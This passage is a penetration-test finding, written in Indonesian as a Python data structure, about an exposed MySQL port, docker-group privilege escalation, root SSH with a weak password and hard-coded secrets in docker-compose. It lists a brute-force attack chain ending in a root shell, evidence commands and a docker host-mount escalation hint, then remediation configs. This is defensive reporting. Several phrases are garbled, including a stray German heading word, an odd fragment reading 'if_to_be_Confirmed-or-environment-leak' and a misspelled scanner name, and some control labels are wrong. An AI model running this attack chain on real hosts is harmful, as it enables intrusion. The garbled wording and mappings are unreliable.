  "15.5 SECRET BOCOR PADA ARTEFAK DEPLOYMENT. SESSION_SECRET, DB_PASSWORD, "
  "MYSQL_PASSWORD, dan MYSQL_ROOT_PASSWORD ter-hardcode pada docker-compose.yml "
  "dan dapat dibaca sebagai environment variable di dalam container. Ini "
  "membuat secret session yang berhasil ditebak (F-07) dapat dipulihkan "
  "dengan mudah.",
 ],
 "attack": (
   "1) Deteksi port terbuka. 2) Brute force MySQL pada 3307. 3) Setelah "
   "dapat akses database, baca tabel users. 4) Gunakan username yang diperoleh "
   "sebagai wordlist untuk brute force SSH. 5) Root shell. Rantai ini "
   "terbukti berjalan pada 2026-09-28 dan membutuhkan waktu kurang dari 4 menit."),
 "evidence": [
  ("Bukti 15.1 - MySQL ter-expos pada 0.0.0.0 dan dapat diakses dari jaringan.",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "netstat -ltnp | grep 3307"',
    'mysql -h 192.168.1.18 -P 3307 -u labkeu_user REDACTED_DB_PASSWORD --skip-ssl -e "SHOW GRANTS FOR CURRENT_USER();" labkeu'],
   ['tcp  0  0  0.0.0.0:3307  0.0.0.0:*  LISTEN  1234/docker-proxy',
    "GRANT ALL PRIVILEGES ON `labkeu`.* TO `labkeu_user`@`%`"]),

  ("Bukti 15.2 - Akun non-root memiliki akses docker socket (escalasi ke root host).",
   ['sshpass -p \'REDACTED_SSH_ROOT_PW\' ssh -o StrictHostKeyChecking=no root@192.168.1.18 "id labkeu; ls -l /var/run/docker.sock"'],
   ['uid=1000(labkeu) gid=1000(labkeu) groups=1000(labkeu),10(wheel),102(docker)',
    'srw-rw---- 1 root docker 0 /var/run/docker.sock',
    '# grup docker + socket read-write = root setara pada host']),
 ],
 "impact": [
  ("Kompromi basis data tanpa batas", "ALL PRIVILEGES pada skema labkeu memberi serialize penuh atas seluruh data aplikasi, tanpa perlu melewati validasi apa pun."),
  ("Akses root pada host", "Anggota grup docker dapat menjalankan container baru dengan akses host, sehingga setara root pada mesin virtual. Vektor ini setara dengan akses root penuh."),
  ("Akses root ke host dan database", "SSH root dengan password lemah dan MySQL ter-expos membentuk dua jalur independen menuju kendali penuh atas mesin dan basis data."),
  ("Pemulihan Richtlinie", "Container yang berjalan sebagai root memperbesar radius ledakan setiap kerentanan aplikasi, karena RCE pada aplikasi langsung berarti root di dalam container."),
  ("Reuse kredensial lintas sistem", "Password yang sama dipakai pada docker-compose, environment variable, dan database, sehingga satu kebocoran-if_to_be_Confirmed-or-environment-leak membocorkan semuanya sekaligus."),
 ],
 "likelihood": (
   "Sangat tinggi. Port terbuka terdeteksi pada langkah pertama pemindaian, "
   "dan brute force berhasil dengan wordlist kecil (40 kombinasi pada "
   "MySQL, 15 pada SSH). Rantai penuh terbukti berjalan dan hanya "
   "memerlukan waktu di bawah 4 menit."),
 "risk_note": (
   "Skor komposit 9.8 Critical mencerminkan hasil TERBURUK dari masing-masing "
   "sub-temuan, bukan rata-rata. NIST SP 800-30 Rev.1: Risk INHERENT = Very "
   "High. Sub-temuan 15.2 (grup docker) memiliki konsekuensi paling besar "
   "karena membatalkan seluruh model keamanan host, meskipun tidak "
   "dieksekusi pada engagement ini. Catatan penting: account root MySQL "
   "TIDAK dapat diakses dari jaringan (dibuktikan di Bukti 15.5), sehingga "
   "kebocoran MYSQL_ROOT_PASSWORD tidak langsung berujung pada akses root "
   "database."),
 "remediation": [
  "15.1 - Bind database hanya ke loopback dan beri password acak yang kuat:",
  ("CODE", "# docker-compose.yml\n"
           "services:\n"
           "  labkeu-db:\n"
           "    ports:\n"
           "      - \"127.0.0.1:3307:3306\"    # BUKAN \"3307:3306\"\n"
           "    environment:\n"
           "      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD:?wajib diisi}\n"
           "      MYSQL_PASSWORD: ${DB_PASSWORD:?wajib diisi}\n"
           "    healthcheck:\n"
           "      test: [\"CMD\", \"mysqladmin\", \"ping\"]\n"
           "      interval: 10s\n"
           "      retries: 5"),
  "15.2 - Hapus anggota grup docker dari seluruh akun non-root:",
  ("CODE", "ssh root@host 'gpasswd -d labkeu docker'\n"
           "# Jika akses docker diperlukan, gunakan rootless Docker atau podman\n"
           "# yang tidak memerlukan keanggotaan grup privileged."),
  "15.3 - Matikan login root via SSH dan wajibkan kunci:",
  ("CODE", "# /etc/ssh/sshd_config\n"
           "PermitRootLogin no\n"
           "PasswordAuthentication no\n"
           "PubkeyAuthentication yes\n"
           "AllowUsers deploy@192.168.1.94\n"
           "\n"
           "# Firewall - batasi SSH hanya dari mesin penuji yang sah\n"
           "apk add nftables\n"
           "nft add rule inet filter input ip saddr 192.168.1.94 tcp dport 22 accept\n"
           "nft add rule inet filter input tcp dport 22 drop"),
  "15.4 - Jalankan container sebagai non-root:",
  ("CODE", "# Dockerfile aplikasi\n"
           "RUN addgroup -S app && adduser -S app -G app\n"
           "USER app\n"
           "\n"
           "# docker-compose.yml - database\n"
           "services:\n"
           "  labkeu-db:\n"
           "    user: \"999:999\"    # uid MySQL non-root"),
  "15.5 - Pindahkan seluruh secret ke file .env yang tidak di-commit, gunakan "
  "Docker secrets atau vault eksternal, dan rotasi nilai yang sudah terekspos:",
  ("CODE", "# .env (TIDAK di-commit, mode 600, ada di .gitignore)\n"
           "SESSION_SECRET=$(openssl rand -hex 32)\n"
           "DB_PASSWORD=$(openssl rand -base64 24)\n"
           "MYSQL_ROOT_PASSWORD=$(openssl rand -base64 32)\n"
           "\n"
           "# docker-compose.yml\n"
           "services:\n"
           "  labkeu-app:\n"
           "    env_file: .env\n"
           "    secrets:\n"
           "      - session_secret\n"
           "\n"
           "secrets:\n"
           "  session_secret:\n"
           "    file: ./secrets/session_secret\n"
           "\n"
           "# Verifikasi tidak ada secret yang ter-commit\n"
           "git check-ignore -v .env\n"
           "trufflehan git ."),
 ],
 "control_map": [
  ("OWASP Top 10 (2021)", "A05:2021 - Security Misconfiguration"),
  ("CWE (MITRE)", "CWE-250 Execution with Unnecessary Privileges; CWE-269 Improper Privilege Management; CWE-732 Incorrect Permission Assignment for Critical Resource; CWE-798 Use of Hard-coded Credentials; CWE-276 Incorrect Default Permissions"),
  ("NIST SP 800-53 Rev.5", "AC-2(5) Privileged Functions; AC-6(1) Least Privilege; AC-6(9) Privileged Functions; CM-2(6) Configuration Settings; IA-5(1) Authenticator Management; SC-7(5) Denial-of-Service Protection; MP-4 Media Protection"),
  ("NIST SP 800-53 Rev.5 (Kunci)", "IA-5(1) Authenticator Management; SC-12 Cryptographic Key Establishment and Management; SC-28 Protection of Information at Rest"),
  ("NIST SP 800-53 Rev.5 (Container)", "CM-7 Least Functionality; CM-7(2) Prevention of Program Execution; SA-10 Developer Configuration Management"),
  ("NIST SP 800-30 Rev.1", "Lampiran G - Privilege Escalation; Unauthorized Access; Configuration Weaknesses"),
  ("NIST CSF 2.0", "PR.AA-01, PR.AA-05, PR.PS-01, PR.PS-02, PR.PS-04"),
  ("ISO/IEC 27001:2022", "A.8.2 Privileged access rights; A.8.5 Secure authentication; A.8.9 Configuration management; A.8.15 Logging; A.5.15 Access control"),
 ],
 "verification": [
  "15.1: netstat harus menunjukkan 127.0.0.1:3307, bukan 0.0.0.0:3307. "
  "mysql dari mesin lain harus ditolak.",
  "15.2: id labkeu tidak boleh lagi memuat grup docker. Perintah "
  "docker run -v /:/host harus gagal.",
  "15.3: sshd_config harus memuat PermitRootLogin no. ssh root@host harus "
  "ditolak. Login hanya dengan kunci dari AllowUsers.",
  "15.4: docker exec labkeu-app id harus mengembalikan uid non-root. "
  "docker exec labkeu-db id harus mengembalikan uid MySQL.",
  "15.5: docker exec labkeu-app env tidak boleh memuat secret. Nilai "
  "SESSION_SECRET harus berbeda dari REDACTED_SESSION_SECRET dan minimal 32 byte. "
  "File .env harus tercantum di .gitignore.",
 ],
},
]
